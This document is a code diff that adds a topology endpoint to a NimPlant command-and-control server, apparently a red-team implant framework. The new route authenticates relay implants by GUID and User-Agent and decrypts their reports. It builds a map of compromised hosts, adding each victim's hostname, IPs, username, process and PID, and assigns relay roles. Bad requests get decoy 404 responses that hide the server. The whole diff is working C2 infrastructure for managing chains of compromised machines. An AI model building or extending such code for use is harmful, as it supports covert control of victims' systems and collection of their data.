@@ -803,6 +803,157 @@ def nim_implants_server(xor_key):
             notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
             return flask.jsonify(status="Not found"), 404
 
+    @app.route(resultPath + "/topology", methods=["POST"])
+    # Receive topology updates from relay implants
+    def receive_topology():
+        client_ip = get_external_ip(flask.request)
+        utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] topology_path: {flask.request.method} {resultPath}/topology from {client_ip}")
+        utils.nimplant_print(f"DEBUG: Complete headers: {dict(flask.request.headers)}")
+        
+        if not flask.request.is_json:
+            utils.nimplant_print(f"DEBUG: ERROR - Request does not contain valid JSON")
+            return flask.jsonify(status="Not found"), 404
+            
+        utils.nimplant_print(f"DEBUG: JSON body: {flask.request.json}")
+        
+        request_id = flask.request.headers.get("X-Request-ID", "NO_ID")
+        agent_header = flask.request.headers.get("User-Agent")
+        
+        utils.nimplant_print(f"DEBUG: Verifying headers - X-Request-ID: '{request_id}'")
+        utils.nimplant_print(f"DEBUG: Verifying headers - User-Agent: '{agent_header}' (expected: '{user_agent}')")
+        
+        data = flask.request.json
+        np: NimPlant = np_server.get_nimplant_by_guid(request_id)
+        
+        if np is not None:
+            utils.nimplant_print(f"DEBUG: Implant found: {np.guid}")
+            
+            if user_agent == agent_header:
+                utils.nimplant_print(f"DEBUG: Valid User-Agent")
+                
+                try:
+                    if "data" not in data:
+                        utils.nimplant_print(f"DEBUG: ERROR - JSON does not contain 'data' field")
+                        return flask.jsonify(status="Not found"), 404
+                        
+                    encrypted_data = data["data"]
+                    utils.nimplant_print(f"DEBUG: Encrypted topology data received (length: {len(encrypted_data) if encrypted_data else 0})")
+                    
+                    utils.nimplant_print(f"DEBUG: Decrypting topology data...")
+                    decrypted_data = decrypt_data(encrypted_data, np.encryption_key)
+                    utils.nimplant_print(f"DEBUG: Decrypted topology data: {decrypted_data}")
+                    
+                    topology_data = json.loads(decrypted_data)
+                    utils.nimplant_print(f"DEBUG: Parsed topology JSON: {topology_data}")
+                    
+                    # Validate minimal topology data structure
+                    if "type" not in topology_data or "topology" not in topology_data:
+                        utils.nimplant_print(f"DEBUG: ERROR - Invalid topology data structure")
+                        return flask.jsonify(status="Not found"), 404
+                    
+                    message_type = topology_data["type"]
+                    topology_info = topology_data["topology"]
+                    
+                    utils.nimplant_print(f"DEBUG: Topology message type: {message_type}")
+                    utils.nimplant_print(f"DEBUG: 🔒 Received minimal topology data (security mode)")
+                    
+                    # Extract minimal data from topology
+                    root_node_id = topology_info.get("root_node_id", "")
+                    node_ids = topology_info.get("node_ids", [])
+                    connections = topology_info.get("connections", [])
+                    last_updated = topology_info.get("last_updated", 0)
+                    total_nodes = topology_info.get("total_nodes", 0)
+                    
+                    utils.nimplant_print(f"DEBUG: 🔒 Root node: {root_node_id}")
+                    utils.nimplant_print(f"DEBUG: 🔒 Node IDs: {node_ids}")
+                    utils.nimplant_print(f"DEBUG: 🔒 Connections: {connections}")
+                    
+                    # Enrich topology with database information
+                    enriched_topology = {
+                        "type": message_type,
+                        "topology": {
+                            "root_node_id": root_node_id,
+                            "node_ids": node_ids,
+                            "connections": connections,
+                            "last_updated": last_updated,
+                            "total_nodes": total_nodes,
+                            "enriched_nodes": {}
+                        }
+                    }
+                    
+                    # For each node ID, get information from database
+                    for node_id in node_ids:
+                        # Try to find this node in our database
+                        node_info = db.db_get_nimplant_by_guid(node_id)
+                        if node_info:
+                            enriched_topology["topology"]["enriched_nodes"][node_id] = {
+                                "nodeID": node_id,
+                                "hostname": node_info.hostname,
+                                "ipExternal": node_info.ip_external,
+                                "ipInternal": node_info.ip_internal,
+                                "username": node_info.username,
+                                "os_build": node_info.os_build,
+                                "process_name": node_info.process_name,
+                                "pid": node_info.pid,
+                                "last_checkin": node_info.last_checkin.isoformat() if node_info.last_checkin else None,
+                                "relay_role": db.db_get_nimplant_relay_role(node_id) or "STANDARD"
+                            }
+                            utils.nimplant_print(f"DEBUG: 🔒 Enriched node {node_id} with DB data")
+                        else:
+                            utils.nimplant_print(f"DEBUG: 🔒 Node {node_id} not found in database")
+                    
+                    # Store enriched topology in database
+                    if db.db_store_topology_update(np.guid, enriched_topology):
+                        utils.nimplant_print(f"DEBUG: Enriched topology stored successfully for {np.guid}")
+                        
+                        # Update relay role based on topology
+                        if root_node_id and node_ids:
+                            # Determine relay role based on position in topology
+                            if root_node_id == np.guid:
+                                # This implant is the root of the topology
+                                if total_nodes > 1:
+                                    db.db_update_nimplant_relay_role(np.guid, "RELAY_SERVER")
+                                    utils.nimplant_print(f"DEBUG: Updated {np.guid} role to RELAY_SERVER")
+                                else:
+                                    db.db_update_nimplant_relay_role(np.guid, "STANDARD")
+                                    utils.nimplant_print(f"DEBUG: Updated {np.guid} role to STANDARD")
+                            else:
+                                # Check if this implant has children (is parent in connections)
+                                has_children = any(conn.get("parent") == np.guid for conn in connections)
+                                is_child = any(conn.get("child") == np.guid for conn in connections)
+                                
+                                if has_children and is_child:
+                                    db.db_update_nimplant_relay_role(np.guid, "RELAY_HYBRID")
+                                    utils.nimplant_print(f"DEBUG: Updated {np.guid} role to RELAY_HYBRID")
+                                elif is_child:
+                                    db.db_update_nimplant_relay_role(np.guid, "RELAY_CLIENT")
+                                    utils.nimplant_print(f"DEBUG: Updated {np.guid} role to RELAY_CLIENT")
+                                else:
+                                    db.db_update_nimplant_relay_role(np.guid, "STANDARD")
+                                    utils.nimplant_print(f"DEBUG: Updated {np.guid} role to STANDARD")
+                        
+                        return flask.jsonify(status="OK"), 200
+                    else:
+                        utils.nimplant_print(f"DEBUG: ERROR - Failed to store topology")
+                        return flask.jsonify(status="Error"), 500
+                        
+                except Exception as e:
+                    utils.nimplant_print(f"DEBUG: ERROR processing topology: {str(e)}")
+                    utils.nimplant_print(f"DEBUG: Exception type: {type(e).__name__}")
+                    import traceback
+                    utils.nimplant_print(f"DEBUG: Traceback: {traceback.format_exc()}")
+                    return flask.jsonify(status="Not found"), 404
+            else:
+                utils.nimplant_print(f"DEBUG: ERROR - Incorrect User-Agent: '{agent_header}'")
+                notify_bad_request(
+                    flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
+                )
+                return flask.jsonify(status="Not found"), 404
+        else:
+            utils.nimplant_print(f"DEBUG: ERROR - Implant with ID not found: {request_id}")
+            notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
+            return flask.jsonify(status="Not found"), 404
+
     @app.errorhandler(Exception)
     def all_exception_handler(error):
         utils.nimplant_print(f"DEBUG: [ERROR HANDLER] Unhandled exception: {type(error).__name__} - {str(error)}")
